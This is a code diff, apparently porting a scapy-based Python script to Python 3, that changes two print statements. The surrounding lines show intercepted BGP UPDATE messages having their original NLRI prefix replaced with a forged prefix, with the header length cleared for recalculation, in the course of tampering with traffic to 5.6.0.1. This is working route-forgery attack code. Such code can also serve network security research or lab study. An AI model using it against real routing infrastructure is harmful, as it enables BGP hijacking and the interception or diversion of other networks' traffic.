@@ -92,7 +92,7 @@ def bgp_edit(pkt):
                 i = temp2[BGPUpdate].nlri.index(or_prefix) #find the index of the prefix in the nlri list
                 temp2[BGPUpdate].nlri.pop(i) #pop(delete) the original nlri from the list
                 temp2[BGPUpdate].nlri.insert(i,frg_prefix) #insert the forged prefix in the same index
-                print "Message Forged..."
+                print("Message Forged...")
                 del temp2[BGPHeader].len #del the bgpheader len to allow scapy to recalculate it
                 forged = True #set the message was forged flag
                 firstfound = True #set the message was forged for the first time flag
@@ -123,7 +123,7 @@ def process(i, payload):
             #if pkt[TCP].flags == 2:
             # firstfound = False
             if firstfound == False:
-                print "NO CHANGES YET !!!!!!!!!!!"
+                print("NO CHANGES YET !!!!!!!!!!!")
             else:
                 pass
             if destination == '5.6.0.1' and len(str(pkt[TCP].payload))!=0:
